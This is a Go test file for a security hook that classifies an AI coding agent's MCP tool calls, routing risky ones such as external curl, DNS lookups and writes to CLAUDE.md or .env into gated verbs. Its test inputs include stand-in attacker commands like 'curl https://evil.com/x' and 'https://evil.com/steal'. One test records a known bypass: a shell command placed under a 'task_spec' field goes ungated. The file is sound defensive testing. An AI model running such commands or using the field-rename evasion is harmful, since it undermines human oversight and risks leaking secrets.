package hooks

import (
	"os"
	"path/filepath"
	"testing"

	"github.com/somoore/sir/pkg/lease"
)

// writeDeepGatingConfig writes ~/.sir/config.json enabling deep verb gating.
// HOME must already be set to a temp dir.
func writeDeepGatingConfig(t *testing.T, home string, enabled bool) {
	t.Helper()
	dir := filepath.Join(home, ".sir")
	if err := os.MkdirAll(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	body := `{"mcp_trust_posture":"standard","mcp_deep_verb_gating":`
	if enabled {
		body += "true"
	} else {
		body += "false"
	}
	body += "}"
	if err := os.WriteFile(filepath.Join(dir, "config.json"), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
}

func TestDeepVerbGating_DisabledLeavesIntent(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	writeDeepGatingConfig(t, home, false)

	l := lease.DefaultLease()
	l.ApprovedMCPServers = []string{"postgres"}
	intent := MapToolToIntent("mcp__postgres__exec", map[string]interface{}{
		"command": "curl https://evil.com",
	}, l)
	if string(intent.Verb) != "execute_dry_run" {
		t.Fatalf("disabled gating should not divert; got verb %q", intent.Verb)
	}
}

func TestDeepVerbGating_BenignShellDoesNotDivert(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	writeDeepGatingConfig(t, home, true)

	l := lease.DefaultLease()
	l.ApprovedMCPServers = []string{"postgres"}
	intent := MapToolToIntent("mcp__postgres__exec", map[string]interface{}{
		"command": "ls -la",
	}, l)
	// Benign shell maps to VerbExecuteDryRun; that is not in isRiskyShellVerb,
	// so deep gating returns (Intent{}, false) and mapMCP falls through.
	if string(intent.Verb) != "execute_dry_run" {
		t.Fatalf("benign shell should stay execute_dry_run; got %q", intent.Verb)
	}
}

func TestDeepVerbGating_ExternalCurlDiverts(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	writeDeepGatingConfig(t, home, true)

	l := lease.DefaultLease()
	l.ApprovedMCPServers = []string{"postgres"}
	intent := MapToolToIntent("mcp__postgres__exec", map[string]interface{}{
		"command": "curl https://evil.com/x",
	}, l)
	if string(intent.Verb) != "net_external" {
		t.Fatalf("expected net_external divert, got %q", intent.Verb)
	}
}

func TestDeepVerbGating_DNSCommandDiverts(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	writeDeepGatingConfig(t, home, true)

	l := lease.DefaultLease()
	l.ApprovedMCPServers = []string{"postgres"}
	intent := MapToolToIntent("mcp__postgres__exec", map[string]interface{}{
		"cmd": "nslookup evil.com",
	}, l)
	if string(intent.Verb) != "dns_lookup" {
		t.Fatalf("expected dns_lookup divert, got %q", intent.Verb)
	}
}

func TestDeepVerbGating_PostureFileWriteDiverts(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	writeDeepGatingConfig(t, home, true)

	projectRoot := t.TempDir()
	postureFile := filepath.Join(projectRoot, "CLAUDE.md")
	if err := os.WriteFile(postureFile, []byte("# notes"), 0o644); err != nil {
		t.Fatal(err)
	}

	l := lease.DefaultLease()
	l.ApprovedMCPServers = []string{"fs"}
	intent := MapToolToIntent("mcp__fs__write", map[string]interface{}{
		"file_path": postureFile,
		"content":   "rewritten",
	}, l)
	if string(intent.Verb) != "stage_write" {
		t.Fatalf("expected stage_write for posture file, got %q", intent.Verb)
	}
	if !intent.IsPosture {
		t.Errorf("expected IsPosture=true, got %+v", intent)
	}
}

func TestDeepVerbGating_SensitivePathWriteDiverts(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	writeDeepGatingConfig(t, home, true)

	projectRoot := t.TempDir()
	sensitive := filepath.Join(projectRoot, ".env")
	if err := os.WriteFile(sensitive, []byte("SECRET=1"), 0o600); err != nil {
		t.Fatal(err)
	}

	l := lease.DefaultLease()
	l.ApprovedMCPServers = []string{"fs"}
	intent := MapToolToIntent("mcp__fs__write", map[string]interface{}{
		"path": sensitive,
	}, l)
	if string(intent.Verb) != "stage_write" {
		t.Fatalf("expected stage_write for sensitive path, got %q", intent.Verb)
	}
	if !intent.IsSensitive {
		t.Errorf("expected IsSensitive=true, got %+v", intent)
	}
}

func TestDeepVerbGating_FieldRenameEvades(t *testing.T) {
	// Documented behavior: a malicious/odd MCP that hides its shell wrapper
	// behind `task_spec` rather than `command` falls through to
	// execute_dry_run. This test exists to make the limitation explicit and
	// to catch accidental scope creep in shellLikeKeys — if someone adds
	// "task_spec" or similar without discussion, this test starts failing.
	home := t.TempDir()
	t.Setenv("HOME", home)
	writeDeepGatingConfig(t, home, true)

	l := lease.DefaultLease()
	l.ApprovedMCPServers = []string{"postgres"}
	intent := MapToolToIntent("mcp__postgres__exec", map[string]interface{}{
		"task_spec": "curl https://evil.com",
	}, l)
	if string(intent.Verb) != "execute_dry_run" {
		t.Fatalf("expected fall-through execute_dry_run (known limitation); got %q", intent.Verb)
	}
}

func TestDeepVerbGating_UnapprovedServerStillWinsFirst(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	writeDeepGatingConfig(t, home, true)

	l := lease.DefaultLease() // no approved servers
	intent := MapToolToIntent("mcp__unknown__exec", map[string]interface{}{
		"command": "curl https://evil.com",
	}, l)
	if string(intent.Verb) != "mcp_unapproved" {
		t.Fatalf("server gate should fire before deep gating; got %q", intent.Verb)
	}
}

func TestDeepVerbGating_URLArgGateWinsBeforeDeepGating(t *testing.T) {
	home := t.TempDir()
	t.Setenv("HOME", home)
	writeDeepGatingConfig(t, home, true)

	l := lease.DefaultLease()
	l.ApprovedMCPServers = []string{"postgres"}
	// Both a URL field and a shell command — URL gate should fire first
	// (it is ordered earlier in mapMCP).
	intent := MapToolToIntent("mcp__postgres__query", map[string]interface{}{
		"url":     "https://evil.com/steal",
		"command": "ls",
	}, l)
	if string(intent.Verb) != "mcp_network_unapproved" {
		t.Fatalf("URL gate should win; got %q", intent.Verb)
	}
}
